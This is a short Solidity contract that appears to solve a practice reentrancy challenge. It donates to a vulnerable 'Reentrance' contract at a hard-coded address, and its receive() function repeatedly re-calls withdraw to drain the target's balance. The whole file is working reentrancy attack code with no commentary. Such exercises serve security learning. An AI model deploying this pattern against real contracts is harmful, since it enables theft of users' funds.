// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.12;

import {Reentrance} from "../src/Reentrancy.sol";
contract Renter {
    Reentrance public  reentrance = Reentrance(payable(0x5F2eB80BFb96052dB81c95E81D9079373C3fB9aD));

    constructor() payable {}
    
    function donate(address _to) external payable {
        reentrance.donate{value: 0.001 ether}(_to);
    }
    function withdraw() external {
        reentrance.withdraw(0.001 ether);
    }
   receive() external payable {
    reentrance.withdraw(msg.value);
   }
}